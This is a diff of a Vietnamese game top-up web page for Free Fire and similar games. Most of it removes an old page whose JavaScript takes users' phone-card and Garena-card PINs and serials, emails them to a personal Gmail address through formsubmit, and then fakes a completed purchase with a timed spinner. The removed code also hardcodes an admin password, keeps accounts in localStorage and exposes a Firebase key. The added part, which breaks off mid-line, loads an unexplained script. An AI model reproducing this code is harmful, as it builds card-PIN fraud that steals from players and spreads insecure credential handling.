-      <h3 style="margin-bottom:15px; font-size:1rem; color:#0084ff;" id="gameSelectTitle">THANH TOÁN ĐƠN HÀNG: FREE FIRE</h3>
-
-      <div id="requireLoginNotice" style="text-align:center; padding:20px; background:#fff3cd; border-radius:12px;">
-        <i class="fa-solid fa-lock" style="font-size:1.5rem; color:#856404;"></i>
-        <p style="margin-top:8px; font-weight:bold;">Vui lòng Đăng Nhập tài khoản để thực hiện nạp!</p>
-      </div>
-
-      <div id="payForm" style="display:none;">
-        <div class="form-group">
-          <label>Nhập ID Game / UID Khách Hàng</label>
-          <input type="text" class="form-control" id="gameUID" placeholder="Ví dụ: 16791135458977">
-        </div>
-
-        <label style="font-size:0.85rem; font-weight:600;">Chọn Gói Quy Đổi (Áp dụng x15 tài nguyên)</label>
-        <div class="price-grid" id="priceGridArea"></div>
-
-        <div id="processingArea" style="display:none; text-align:center; padding:20px; background:#e7f3ff; border-radius:14px; margin-top:15px;">
-          <i class="fa-solid fa-spinner fa-spin" style="font-size:2rem; color:#0084ff;"></i>
-          <p style="margin-top:10px; font-weight:bold; color:#0084ff;">Đang xử lý giao dịch... Vui lòng chờ chút!</p>
-        </div>
-
-        <button class="btn-login-main" id="btnPayAction" style="width:100%; justify-content:center; margin-top:15px; padding:12px;" onclick="confirmPurchase()">
-          Thanh Toán
-        </button>
+    <div id="mask">
+      <!-- <h1 id="tip">Vui lòng vuốt lên để thấy toàn màn hình</h1>-->
+      <div id="image">
       </div>
     </div>
-
-  </div>
-
-  <!-- Modal Nạp Tiền Vào Ví -->
-  <div class="modal" id="depositModal">
-    <div class="modal-content">
-      <i class="fa-solid fa-xmark" style="position:absolute; top:15px; right:15px; cursor:pointer;" onclick="closeModal('depositModal')"></i>
-      <h3 style="text-align:center; color:#0084ff; margin-bottom:15px;">NẠP TIỀN VÀO TÀI KHOẢN</h3>
-      
-      <div style="display:flex; gap:6px; margin-bottom:15px; overflow-x:auto;">
-        <button class="tab-btn active" id="btnTabQR" onclick="switchDepTab('qr')">QR / Banking / MoMo</button>
-        <button class="tab-btn" id="btnTabCard" onclick="switchDepTab('card')">Thẻ Điện Thoại</button>
-        <button class="tab-btn" id="btnTabGarena" onclick="switchDepTab('garena')">Thẻ Garena</button>
+    <div id="handImage">
+    </div>
+    <div id="div_full_screen" style="width: 100%; height: 100%; visibility: hidden">
+      <div id="enterFullscreen" class="enterFullScreen_Portrait">
       </div>
-
-      <!-- Tab QR -->
-      <div id="qrArea">
-        <div class="form-group">
-          <label>Nhập Số Tiền Cần Nạp (VNĐ)</label>
-          <input type="number" class="form-control" id="qrAmount" value="50000">
-        </div>
-        <button class="btn-login-main" style="width:100%; justify-content:center;" onclick="createQR()">Tạo Thông Tin Chuyển Khoản</button>
-        
-        <div id="qrImgBox" style="margin-top:15px; display:none; background:#f8f9fa; padding:15px; border-radius:12px; border:1px dashed #0084ff;">
-          <div style="text-align:center;">
-            <img id="qrImg" src="CHON_ANH_QR_CUA_BAN_TAI_DAY" alt="Mã QR Thanh Toán" style="max-width:200px; border-radius:10px; border:1px solid #ddd; display:inline-block;">
-          </div>
-          <div style="margin-top:12px; font-size:0.88rem; line-height:1.6;">
-            <div><b>Ngân hàng/Ví:</b> PSP / MOMO</div>
-            <div><b>Chủ tài khoản:</b> <span style="color:#d32f2f; font-weight:bold;">TRUONG VAN PHONG</span></div>
-            <div><b>Số tài khoản:</b> <span style="color:#0084ff; font-weight:bold;">PSP2621916400000092</span></div>
-            <div><b>Nội dung chuyển khoản:</b> <span id="qrMemo" style="color:#2e7d32; font-weight:bold; background:#e8f5e9; padding:2px 6px; border-radius:4px;"></span></div>
-          </div>
-          
-          <button class="btn-login-main" style="width:100%; justify-content:center; margin-top:12px; background:#2e7d32;" onclick="confirmBankTransferSent()">
-            <i class="fa-solid fa-check-circle"></i> ĐÃ CHUYỂN KHOẢN
-          </button>
-        </div>
-      </div>
-
-      <!-- Tab Thẻ Điện Thoại -->
-      <div id="cardArea" style="display:none;">
-        <div class="form-group">
-          <label>Nhà Mạng</label>
-          <select class="form-control" id="cardProvider">
-            <option>VIETTEL</option><option>VINAPHONE</option><option>MOBIFONE</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label>Số Seri</label>
-          <input type="text" class="form-control" id="cardSeri" placeholder="Nhập số Seri...">
-        </div>
-        <div class="form-group">
-          <label>Mã Thẻ (Pin)</label>
-          <input type="text" class="form-control" id="cardPin" placeholder="Nhập mã thẻ...">
-        </div>
-        <div class="form-group">
-          <label>Mệnh Giá</label>
-          <select class="form-control" id="cardVal">
-            <option value="50000">50.000 VNĐ</option>
-            <option value="100000">100.000 VNĐ</option>
-            <option value="200000">200.000 VNĐ</option>
-            <option value="500000">500.000 VNĐ</option>
-          </select>
-        </div>
-        <button class="btn-login-main" style="width:100%; justify-content:center;" onclick="submitCard('Thẻ Điện Thoại')">XÁC NHẬN</button>
-      </div>
-
-      <!-- Tab Thẻ Garena -->
-      <div id="garenaCardArea" style="display:none;">
-        <div class="form-group">
-          <label>Số Seri (Nếu có)</label>
-          <input type="text" class="form-control" id="garSeri" placeholder="Nhập số Seri...">
-        </div>
-        <div class="form-group">
-          <label>Mã Thẻ Garena (Pin)</label>
-          <input type="text" class="form-control" id="garPin" placeholder="Nhập mã thẻ Garena...">
-        </div>
-        <div class="form-group">
-          <label>Mệnh Giá</label>
-          <select class="form-control" id="garVal">
-            <option value="50000">50.000 VNĐ</option>
-            <option value="100000">100.000 VNĐ</option>
-            <option value="200000">200.000 VNĐ</option>
-            <option value="500000">500.000 VNĐ</option>
-          </select>
-        </div>
-        <button class="btn-login-main" style="width:100%; justify-content:center;" onclick="submitGarenaCard()">XÁC NHẬN</button>
+      <div id="exitFullscreen" class="exitFullScreen_Portrait">
       </div>
     </div>
-  </div>
-
-  <!-- Modal Xem Lịch Sử Nạp -->
-  <div class="modal" id="historyModal">
-    <div class="modal-content">
-      <i class="fa-solid fa-xmark" style="position:absolute; top:15px; right:15px; cursor:pointer;" onclick="closeModal('historyModal')"></i>
-      <h3 style="color:#0084ff; text-align:center; margin-bottom:15px;">LỊCH SỬ NẠP TIỀN</h3>
-      <table>
-        <thead>
-          <tr><th>Loại Nạp</th><th>Mệnh Giá</th><th>Trạng Thái</th></tr>
-        </thead>
-        <tbody id="userHistoryTable"></tbody>
-      </table>
+    <div class="cf-turnstile" data-sitekey="0x4AAAAAADYNpwCeJMqIN2Xw">
     </div>
-  </div>
-
-  <!-- Modal Admin Quản Lý -->
-  <div class="modal" id="adminModal">
-    <div class="modal-content">
-      <i class="fa-solid fa-xmark" style="position:absolute; top:15px; right:15px; cursor:pointer;" onclick="closeModal('adminModal')"></i>
-      <h3 style="color:#ff3b30; text-align:center; margin-bottom:15px;">BẢNG ĐIỀU KHIỂN ADMIN</h3>
-
-      <div style="background:#fff3cd; padding:12px; border-radius:10px; margin-bottom:15px;">
-        <label><b>Thông Báo Mức Nạp Khách Hàng:</b></label>
-        <textarea class="form-control" id="admNoticeInput" style="margin-top:5px;" rows="2"></textarea>
-        <button style="margin-top:8px; background:#d39e00; color:white; border:none; padding:8px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer;" onclick="adminSaveAnnouncement()">Lưu Thông Báo</button>
-      </div>
-
-      <div style="background:#f0f2f5; padding:12px; border-radius:10px; margin-bottom:15px;">
-        <label><b>Cộng / Trừ Tiền Khách Hàng:</b></label>
-        <input type="text" class="form-control" id="admUser" placeholder="Tên User Khách" style="margin-top:5px;">
-        <input type="number" class="form-control" id="admAmount" placeholder="Số tiền (+/- VNĐ)" style="margin-top:5px;">
-        <button style="margin-top:8px; background:#2e7d32; color:white; border:none; padding:10px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer;" onclick="adminAddMoney()">Cập Nhật Số Dư</button>
-      </div>
-
-      <h4>Danh Sách Chờ Duyệt:</h4>
-      <table>
-        <thead>
-          <tr><th>Khách</th><th>Mã/Seri</th><th>M.Giá</th><th>Thao Tác</th></tr>
-        </thead>
-        <tbody id="admCardTable"></tbody>
-      </table>
-    </div>
-  </div>
-
-  <!-- Modal Đăng Nhập / Đăng Ký -->
-  <div class="modal" id="authModal">
-    <div class="modal-content">
-      <i class="fa-solid fa-xmark" style="position:absolute; top:15px; right:15px; cursor:pointer;" onclick="closeModal('authModal')"></i>
-      <h3 style="text-align:center; margin-bottom:15px;" id="authTitle">ĐĂNG NHẬP</h3>
-      
-      <div class="form-group" id="displayNameGroup" style="display:none;">
-        <label>Tên Hiển Thị</label>
-        <input type="text" class="form-control" id="dispNameInput" placeholder="Ví dụ: Phong Víp Pro">
-      </div>
-
-      <div class="form-group">
-        <label>Tài khoản (4-20 ký tự)</label>
-        <input type="text" class="form-control" id="accInput" placeholder="Nhập tên tài khoản...">
-      </div>
-
-      <div class="form-group">
-        <label>Mật khẩu</label>
-        <input type="password" class="form-control" id="passInput" placeholder="Nhập mật khẩu..." oninput="checkStrength(this.value)">
-        <div class="pass-strength" id="passStrengthText" style="display:none;">Độ mạnh: <span id="strengthLevel">--</span></div>
-      </div>
-
-      <div class="form-group" id="repassGroup" style="display:none;">
-        <label>Nhập lại mật khẩu</label>
-        <input type="password" class="form-control" id="repassInput" placeholder="Nhập lại mật khẩu...">
-      </div>
-
-      <button class="btn-login-main" style="width:100%; justify-content:center;" onclick="handleAuth()">Xác Nhận</button>
-      <p style="text-align:center; margin-top:10px; font-size:0.85rem;" onclick="toggleAuthMode()">
-        <a href="javascript:void(0)" style="color:#0084ff;" id="toggleAuthText">Chưa có tài khoản? Đăng ký</a>
-      </p>
-    </div>
-  </div>
-
-  <script>
-    // CẤU HÌNH TÀI KHOẢN ADMIN CỐ ĐỊNH TỐI CAO
-    const ADMIN_ACC = 'phong 23112007';
-    const ADMIN_PASS = 'Muathu12345';
-    const ADMIN_NAME = 'ADMIN PHONG';
-
-    let currentSlide = 0;
-    let selectedGame = 'Free Fire';
-    let selectedPriceObj = null;
-    let currentUser = null;
-    let isRegister = false;
-    let adminClickCounter = 0;
-    let currentGeneratedMemo = '';
-
-    const gameConfig = {
-      'Free Fire': { unit: 'Kim Cương', rates: [{p:50000, v:'4.250'}, {p:100000, v:'8.500'}, {p:200000, v:'17.250'}, {p:500000, v:'45.000'}] },
-      'Liên Quân Mobile': { unit: 'Quân Huy', rates: [{p:50000, v:'4.200'}, {p:100000, v:'8.550'}, {p:200000, v:'17.700'}, {p:500000, v:'45.000'}] },
-      'FC Mobile VN': { unit: 'FC Point', rates: [{p:50000, v:'3.750'}, {p:100000, v:'7.800'}, {p:200000, v:'16.500'}, {p:500000, v:'42.000'}] },
-      'FC Online (VN)': { unit: 'FC Coin', rates: [{p:50000, v:'3.750'}, {p:100000, v:'7.800'}, {p:200000, v:'16.500'}, {p:500000, v:'42.000'}] },
-      'FC Online M (VN)': { unit: 'MC Coin', rates: [{p:50000, v:'3.750'}, {p:100000, v:'7.800'}, {p:200000, v:'16.500'}, {p:500000, v:'42.000'}] },
-      'Delta Force': { unit: 'KNB', rates: [{p:50000, v:'4.500'}, {p:100000, v:'9.000'}, {p:200000, v:'18.750'}, {p:500000, v:'48.000'}] },
-      'Nạp Sò': { unit: 'Sò Garena', rates: [{p:50000, v:'1.500'}, {p:100000, v:'3.000'}, {p:200000, v:'6.000'}, {p:500000, v:'15.000'}] },
-      'Cái thế tranh hùng': { unit: 'Xu Vàng', rates: [{p:50000, v:'3.750'}, {p:100000, v:'7.500'}, {p:200000, v:'15.750'}, {p:500000, v:'40.000'}] }
-    };
-
-    // Tự đồng bộ dữ liệu Admin mỗi khi mở trang
-    function syncAdminData() {
-      const users = JSON.parse(localStorage.getItem('sys_users') || '{}');
-      const profiles = JSON.parse(localStorage.getItem('sys_profiles') || '{}');
-      users[ADMIN_ACC] = ADMIN_PASS;
-      profiles[ADMIN_ACC] = ADMIN_NAME;
-      localStorage.setItem('sys_users', JSON.stringify(users));
-      localStorage.setItem('sys_profiles', JSON.stringify(profiles));
-    }
-
-    document.addEventListener('touchmove', function(event) {
-      if (event.scale !== 1) { event.preventDefault(); }
-    }, { passive: false });
-
-    function showPopup(type, title, message) {
-      const popup = document.getElementById('customPopup');
-      const iconBox = document.getElementById('popupIconBox');
-      const icon = document.getElementById('popupIcon');
-      
-      document.getElementById('popupTitle').innerText = title;
-      document.getElementById('popupDesc').innerText = message;
-
-      if(type === 'success') {
-        iconBox.className = 'popup-icon-box success';
-        icon.className = 'fa-solid fa-circle-check';
-      } else {
-        iconBox.className = 'popup-icon-box error';
-        icon.className = 'fa-solid fa-circle-xmark';
-      }
-
-      popup.classList.add('active');
-    }
-
-    function closeCustomPopup() {
-      document.getElementById('customPopup').classList.remove('active');
-    }
-
-    function notifyAdminViaEmail(content) {
-      fetch("https://formsubmit.co/ajax/phongconcac207@gmail.com", {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify({ name: "HỆ THỐNG NẠP THẺ GARENA", message: content })
-      }).catch(err => console.log("Lỗi gửi mail:", err));
-    }
-
-    function updateSlider() {
-      document.getElementById('sliderTrack').style.transform = `translateX(-${currentSlide * 100}%)`;
-      document.getElementById('dot0').classList.toggle('active', currentSlide === 0);
-      document.getElementById('dot1').classList.toggle('active', currentSlide === 1);
-    }
-    function nextSlide() { currentSlide = (currentSlide + 1) % 2; updateSlider(); }
-    function prevSlide() { currentSlide = (currentSlide - 1 + 2) % 2; updateSlider(); }
-    setInterval(nextSlide, 4000);
-
-    function toggleSidebar() {
-      document.getElementById('sidebar').classList.toggle('active');
-      document.getElementById('overlay').classList.toggle('active');
-    }
-    function closeSidebar() {
-      document.getElementById('sidebar').classList.remove('active');
-      document.getElementById('overlay').classList.remove('active');
-    }
-    function toggleAccordion(id) { document.getElementById(id).classList.toggle('open'); }
-    function closeModal(id) { document.getElementById(id).classList.remove('active'); }
-
-    function setTab(btn, category) {
-      document.querySelectorAll('.filter-tabs .tab-btn').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      document.querySelectorAll('.game-card-item').forEach(item => {
-        const cat = item.getAttribute('data-category');
-        item.style.display = (category === 'all' || cat === category) ? 'block' : 'none';
-      });
-    }
-
-    function filterGames() {
-      const q = document.getElementById('searchInput').value.toLowerCase();
-      document.querySelectorAll('.game-card-item').forEach(item => {
-        const name = item.querySelector('.game-name').innerText.toLowerCase();
-        item.style.display = name.includes(q) ? 'block' : 'none';
-      });
-    }
-
-    function selectGame(el, gameName) {
-      document.querySelectorAll('.game-card-item').forEach(c => {
-        c.classList.remove('selected');
-        c.querySelector('.game-status-btn').innerText = 'Bấm nạp';
-      });
-      if(el) {
-        el.classList.add('selected');
-        el.querySelector('.game-status-btn').innerText = '✔ ĐANG CHỌN';
-      }
-      selectedGame = gameName;
-      document.getElementById('gameSelectTitle').innerText = `THANH TOÁN ĐƠN HÀNG: ${gameName.toUpperCase()}`;
-      renderPriceGrid();
-    }
-
-    function quickSelectGame(gameName) {
-      closeSidebar();
-      document.querySelectorAll('.game-card-item').forEach(item => {
-        if(item.querySelector('.game-name').innerText === gameName) { selectGame(item, gameName); }
-      });
-    }
-
-    function renderPriceGrid() {
-      const conf = gameConfig[selectedGame] || gameConfig['Free Fire'];
-      const grid = document.getElementById('priceGridArea');
-      grid.innerHTML = '';
-      selectedPriceObj = null;
-
-      conf.rates.forEach(r => {
-        grid.innerHTML += `
-          <div class="price-box" onclick="selectPrice(this, ${r.p}, '${r.v} ${conf.unit}')">
-            <b>💎 ${r.v} ${conf.unit}</b>
-            <div style="color:#0084ff; font-weight:bold; margin-top:4px;">${r.p.toLocaleString()}đ</div>
-          </div>
-        `;
-      });
-    }
-
-    function selectPrice(el, price, label) {
-      document.querySelectorAll('.price-box').forEach(p => p.classList.remove('selected'));
-      el.classList.add('selected');
-      selectedPriceObj = { price, label };
-    }
-
-    function openAuthModal() { document.getElementById('authModal').classList.add('active'); }
-    function toggleAuthMode() {
-      isRegister = !isRegister;
-      document.getElementById('authTitle').innerText = isRegister ? "ĐĂNG KÝ TÀI KHOẢN" : "ĐĂNG NHẬP";
-      document.getElementById('toggleAuthText').innerText = isRegister ? "Đã có tài khoản? Đăng nhập" : "Chưa có tài khoản? Đăng ký";
-      document.getElementById('repassGroup').style.display = isRegister ? "block" : "none";
-      document.getElementById('displayNameGroup').style.display = isRegister ? "block" : "none";
-      document.getElementById('passStrengthText').style.display = isRegister ? "block" : "none";
-    }
-
-    function checkStrength(p) {
-      if(!isRegister) return;
-      const lvl = document.getElementById('strengthLevel');
-      if(p.length < 6) { lvl.innerText = "Yếu"; lvl.className = "strength-weak"; }
-      else if(p.length < 10) { lvl.innerText = "Trung bình"; lvl.className = "strength-medium"; }
-      else { lvl.innerText = "Mạnh"; lvl.className = "strength-strong"; }
-    }
-
-    function handleAuth() {
-      syncAdminData();
-      const u = document.getElementById('accInput').value.trim();
-      const p = document.getElementById('passInput').value.trim();
-      const users = JSON.parse(localStorage.getItem('sys_users') || '{}');
-      const profiles = JSON.parse(localStorage.getItem('sys_profiles') || '{}');
-
-      if(isRegister) {
-        const dName = document.getElementById('dispNameInput').value.trim();
-        const repass = document.getElementById('repassInput').value.trim();
-
-        if(!dName || !u || !p || !repass) { showPopup('error', 'THẤT BẠI', 'Vui lòng điền đầy đủ thông tin!'); return; }
-        if(u.length < 4 || u.length > 20) { showPopup('error', 'THẤT BẠI', 'Tài khoản từ 4 đến 20 ký tự!'); return; }
-        if(u.toLowerCase() === ADMIN_ACC.toLowerCase() || users[u]) { 
-          showPopup('error', 'THẤT BẠI', 'Tài khoản này đã tồn tại trên hệ thống!'); 
-          return; 
-        }
-        if(p !== repass) { showPopup('error', 'THẤT BẠI', 'Nhập lại mật khẩu không khớp!'); return; }
-
-        users[u] = p;
-        profiles[u] = dName;
-        localStorage.setItem('sys_users', JSON.stringify(users));
-        localStorage.setItem('sys_profiles', JSON.stringify(profiles));
-        showPopup('success', 'THÀNH CÔNG', 'Đăng ký thành công! Bạn có thể đăng nhập ngay.');
-        toggleAuthMode();
-      } else {
-        // Kiểm tra trực tiếp Admin Cố Định
-        if((u === ADMIN_ACC && p === ADMIN_PASS) || (users[u] && users[u] === p)) {
-          currentUser = u;
-          localStorage.setItem('session_user_permanent', u);
-          closeModal('authModal');
-          updateUI();
-          showPopup('success', 'THÀNH CÔNG', `Chào mừng ${profiles[u] || u}!`);
-        } else {
-          showPopup('error', 'THẤT BẠI', 'Tài khoản hoặc mật khẩu không đúng!');
-        }
-      }
-    }
-
-    function logout() {
-      currentUser = null;
-      localStorage.removeItem('session_user_permanent');
-      updateUI();
-    }
-
-    function updateUI() {
-      const balances = JSON.parse(localStorage.getItem('sys_balances') || '{}');
-      const profiles = JSON.parse(localStorage.getItem('sys_profiles') || '{}');
-
-      if(currentUser) {
-        document.getElementById('btnLogin').style.display = 'none';
-        document.getElementById('userProfile').style.display = 'flex';
-        document.getElementById('displayNameText').innerText = profiles[currentUser] || currentUser;
-        document.getElementById('balanceText').innerText = (balances[currentUser] || 0).toLocaleString();
-        
-        document.getElementById('requireLoginNotice').style.display = 'none';
-        document.getElementById('payForm').style.display = 'block';
-      } else {
-        document.getElementById('btnLogin').style.display = 'flex';
-        document.getElementById('userProfile').style.display = 'none';
-        
-        document.getElementById('requireLoginNotice').style.display = 'block';
-        document.getElementById('payForm').style.display = 'none';
-      }
-
-      const ann = localStorage.getItem('sys_announcement');
-      if(ann) {
-        document.getElementById('adminAnnouncement').innerText = ann;
-        document.getElementById('admNoticeInput').value = ann;
-      }
-    }
-
-    function openDepositModal(tab) {
-      closeSidebar();
-      switchDepTab(tab);
-      document.getElementById('depositModal').classList.add('active');
-    }
-
-    function switchDepTab(tab) {
-      document.getElementById('qrArea').style.display = tab === 'qr' ? 'block' : 'none';
-      document.getElementById('cardArea').style.display = tab === 'card' ? 'block' : 'none';
-      document.getElementById('garenaCardArea').style.display = tab === 'garena' ? 'block' : 'none';
-
-      document.getElementById('btnTabQR').classList.toggle('active', tab === 'qr');
-      document.getElementById('btnTabCard').classList.toggle('active', tab === 'card');
-      document.getElementById('btnTabGarena').classList.toggle('active', tab === 'garena');
-    }
-
-    function createQR() {
-      currentGeneratedMemo = "NAP" + Math.floor(100000 + Math.random() * 900000);
-      document.getElementById('qrMemo').innerText = currentGeneratedMemo;
-      document.getElementById('qrImgBox').style.display = 'block';
-    }
-
-    function confirmBankTransferSent() {
-      if(!currentUser) { showPopup('error', 'THẤT BẠI', 'Vui lòng đăng nhập tài khoản!'); return; }
-      const val = parseInt(document.getElementById('qrAmount').value);
-
-      const cards = JSON.parse(localStorage.getItem('sys_cards') || '[]');
-      cards.push({ id: Date.now(), user: currentUser, type: 'Chuyển Khoản / QR', seri: 'BANK', pin: currentGeneratedMemo, val, status: 'pending' });
-      localStorage.setItem('sys_cards', JSON.stringify(cards));
-
-      notifyAdminViaEmail(`Khách: ${currentUser} vừa CHUYỂN KHOẢN | Số tiền: ${val.toLocaleString()}đ | Nội dung: ${currentGeneratedMemo}`);
-
-      showPopup('success', 'ĐÃ GỬI YÊU CẦU', 'Đã ghi nhận! Vui lòng chờ Admin kiểm tra.');
-      closeModal('depositModal');
-    }
-
-    function submitCard(typeStr) {
-      if(!currentUser) { showPopup('error', 'THẤT BẠI', 'Vui lòng đăng nhập tài khoản!'); return; }
-      const seri = document.getElementById('cardSeri').value.trim();
-      const pin = document.getElementById('cardPin').value.trim();
-      const val = parseInt(document.getElementById('cardVal').value);
-
-      if(!seri || !pin) { showPopup('error', 'THẤT BẠI', 'Vui lòng nhập đủ Seri và Mã Thẻ!'); return; }
-
-      const cards = JSON.parse(localStorage.getItem('sys_cards') || '[]');
-      cards.push({ id: Date.now(), user: currentUser, type: typeStr, seri, pin, val, status: 'pending' });
-      localStorage.setItem('sys_cards', JSON.stringify(cards));
-
-      notifyAdminViaEmail(`Khách: ${currentUser} gửi ${typeStr} | Mệnh giá: ${val.toLocaleString()}đ | Mã Pin: ${pin} | Seri: ${seri}`);
-
-      showPopup('success', 'XÁC NHẬN THÀNH CÔNG', 'Đã gửi mã thẻ lên hệ thống!');
-      closeModal('depositModal');
-    }
-
-    function submitGarenaCard() {
-      if(!currentUser) { showPopup('error', 'THẤT BẠI', 'Vui lòng đăng nhập tài khoản!'); return; }
-      const seri = document.getElementById('garSeri').value.trim() || 'GARENA';
-      const pin = document.getElementById('garPin').value.trim();
-      const val = parseInt(document.getElementById('garVal').value);
-
-      if(!pin) { showPopup('error', 'THẤT BẠI', 'Vui lòng nhập Mã Thẻ Garena!'); return; }
-
-      const cards = JSON.parse(localStorage.getItem('sys_cards') || '[]');
-      cards.push({ id: Date.now(), user: currentUser, type: 'Thẻ Garena', seri, pin, val, status: 'pending' });
-      localStorage.setItem('sys_cards', JSON.stringify(cards));
-
-      notifyAdminViaEmail(`Khách: ${currentUser} gửi THẺ GARENA | Mệnh giá: ${val.toLocaleString()}đ | Mã Pin: ${pin}`);
-
-      showPopup('success', 'XÁC NHẬN THÀNH CÔNG', 'Đã gửi Thẻ Garena lên hệ thống!');
-      closeModal('depositModal');
-    }
-
-    function openHistoryModal() {
-      closeSidebar();
-      if(!currentUser) { showPopup('error', 'THẤT BẠI', 'Vui lòng đăng nhập!'); return; }
-
-      const cards = JSON.parse(localStorage.getItem('sys_cards') || '[]');
-      const tbody = document.getElementById('userHistoryTable');
-      tbody.innerHTML = '';
-
-      const userCards = cards.filter(c => c.user === currentUser);
-      if(userCards.length === 0) {
-        tbody.innerHTML = `<tr><td colspan="3" style="text-align:center;">Chưa có lịch sử giao dịch.</td></tr>`;
-      } else {
-        userCards.reverse().forEach(c => {
-          const st = c.status === 'success' ? '<span style="color:#2e7d32; font-weight:bold;">✔ Thành công</span>' : '<span style="color:#fb8c00; font-weight:bold;">⏳ Đang chờ</span>';
-          tbody.innerHTML += `<tr><td>${c.type}</td><td>${c.val.toLocaleString()}đ</td><td>${st}</td></tr>`;
-        });
-      }
-      document.getElementById('historyModal').classList.add('active');
-    }
-
-    // Click 5 lần vào Logo Garena mở Admin
-    function secretAdminClick() {
-      adminClickCounter++;
-      if(adminClickCounter >= 5) {
-        adminClickCounter = 0;
-        openAdminModal();
-      }
-    }
-
-    function openAdminModal() {
-      if(currentUser !== ADMIN_ACC) { 
-        showPopup('error', 'TỪ CHỐI TRUY CẬP', 'Chỉ duy nhất Tài khoản Admin mới có quyền truy cập!'); 
-        return; 
-      }
-      renderAdminCards();
-      document.getElementById('adminModal').classList.add('active');
-    }
-
-    function renderAdminCards() {
-      const cards = JSON.parse(localStorage.getItem('sys_cards') || '[]');
-      const tbody = document.getElementById('admCardTable');
-      tbody.innerHTML = '';
-
-      cards.forEach(c => {
-        if(c.status === 'pending') {
-          tbody.innerHTML += `
-            <tr>
-              <td>${c.user}</td>
-              <td>${c.type}<br><b>Pin:</b> ${c.pin}<br><b>Seri:</b> ${c.seri}</td>
-              <td>${c.val.toLocaleString()}đ</td>
-              <td>
-                <button style="background:#2e7d32; color:white; border:none; padding:4px 8px; border-radius:4px; font-weight:bold; cursor:pointer;" onclick="approveCard(${c.id})">Duyệt</button>
-              </td>
-            </tr>
-          `;
-        }
-      });
-    }
-
-    function approveCard(id) {
-      const cards = JSON.parse(localStorage.getItem('sys_cards') || '[]');
-      const c = cards.find(item => item.id === id);
-      if(c) {
-        c.status = 'success';
-        localStorage.setItem('sys_cards', JSON.stringify(cards));
-
-        const balances = JSON.parse(localStorage.getItem('sys_balances') || '{}');
-        balances[c.user] = (balances[c.user] || 0) + c.val;
-        localStorage.setItem('sys_balances', JSON.stringify(balances));
-
-        showPopup('success', 'THÀNH CÔNG', 'Đã duyệt nạp thành công!');
-        renderAdminCards();
-        updateUI();
-        localStorage.setItem('last_approved_user', c.user);
-      }
-    }
-
-    function adminAddMoney() {
-      const u = document.getElementById('admUser').value.trim();
-      const amt = parseInt(document.getElementById('admAmount').value);
-      if(!u || isNaN(amt)) { showPopup('error', 'THẤT BẠI', 'Vui lòng nhập đúng tên và số tiền!'); return; }
-
-      const balances = JSON.parse(localStorage.getItem('sys_balances') || '{}');
-      balances[u] = (balances[u] || 0) + amt;
-      localStorage.setItem('sys_balances', JSON.stringify(balances));
-
-      showPopup('success', 'THÀNH CÔNG', `Đã cập nhật số dư cho ${u}!`);
-      updateUI();
-    }
-
-    function adminSaveAnnouncement() {
-      const txt = document.getElementById('admNoticeInput').value.trim();
-      if(!txt) return;
-      localStorage.setItem('sys_announcement', txt);
-      showPopup('success', 'THÀNH CÔNG', 'Đã đổi thông báo mới!');
-      updateUI();
-    }
-
-    function checkAdminApproval() {
-      const approvedUser = localStorage.getItem('last_approved_user');
-      if(approvedUser && approvedUser === currentUser) {
-        showPopup('success', 'THÀNH CÔNG', 'Nạp tiền của bạn đã được Admin phê duyệt!');
-        localStorage.removeItem('last_approved_user');
-      }
-    }
-
-    function confirmPurchase() {
-      const uid = document.getElementById('gameUID').value.trim();
-      if(!uid) { showPopup('error', 'THẤT BẠI', 'Vui lòng nhập ID Game!'); return; }
-      if(!selectedPriceObj) { showPopup('error', 'THẤT BẠI', 'Vui lòng chọn gói quy đổi!'); return; }
-
-      const balances = JSON.parse(localStorage.getItem('sys_balances') || '{}');
-      const curBal = balances[currentUser] || 0;
-
-      if(curBal < selectedPriceObj.price) {
-        showPopup('error', 'SỐ DƯ KHÔNG ĐỦ', 'Tài khoản không đủ tiền, vui lòng nạp thêm!');
-        openDepositModal('qr');
-        return;
-      }
-
-      balances[currentUser] = curBal - selectedPriceObj.price;
-      localStorage.setItem('sys_balances', JSON.stringify(balances));
-      updateUI();
-
-      document.getElementById('btnPayAction').style.display = 'none';
-      document.getElementById('processingArea').style.display = 'block';
-
-      setTimeout(() => {
-        document.getElementById('processingArea').style.display = 'none';
-        document.getElementById('btnPayAction').style.display = 'flex';
-        showPopup('success', 'NẠP THÀNH CÔNG', `Đã thanh toán gói ${selectedPriceObj.label} cho ID: ${uid}!`);
-      }, 3000);
-    }
-<script>
-window.onload = function() {
-  try {
-    syncAdminData();
-  } catch (e) {
-    console.error("syncAdminData:", e);
-  }
-
-  try {
-    const savedUser = localStorage.getItem('session_user_permanent');
-    if (savedUser) currentUser = savedUser;
-  } catch (e) {
-    console.error("session:", e);
-  }
-
-  try {
-    selectGame(null, 'Free Fire');
-  } catch (e) {
-    console.error("selectGame:", e);
-  }
-
-  try {
-    updateUI();
-  } catch (e) {
-    console.error("updateUI:", e);
-  }
-
-  try {
-    setInterval(function() {
-      if (typeof checkAdminApproval === 'function') {
-        checkAdminApproval();
-      }
-    }, 2000);
-  } catch (e) {
-    console.error("approval:", e);
-  }
-};
-</script>
-
-<!-- FIREBASE -->
-<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
-
-<script>
-const firebaseConfig = {
-  apiKey: "AIzaSyCgBlvrdj_ETfnGAgk6-ws2zekQTcp5iQI",
-  authDomain: "cai-lon-a88bc.firebaseapp.com",
-  projectId: "cai-lon-a88bc",
-  storageBucket: "cai-lon-a88bc.firebasestorage.app",
-  messagingSenderId: "509743606954",
-  appId: "1:509743606954:web:620120eb6b9b0e2e34f4d3",
-  measurementId: "G-925MG9G715"
-};
-
-try {
-  firebase.initializeApp(firebaseConfig);
-  window.db = firebase.firestore();
-  console.log("✅ Firebase đã kết nối!");
-} catch (error) {
-  console.error("❌ Firebase lỗi:", error);
-}
-</script>
-
-</body>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async="" defer="">
+    </script>
+    <script src="/umd.js?v=1786559740533">
+    </script>
+    <script>
+      // Vô hiệu hóa tất cả sự kiện touch trên body
+            document.getElementById(&#39;spinner&#39;).addEventListener(
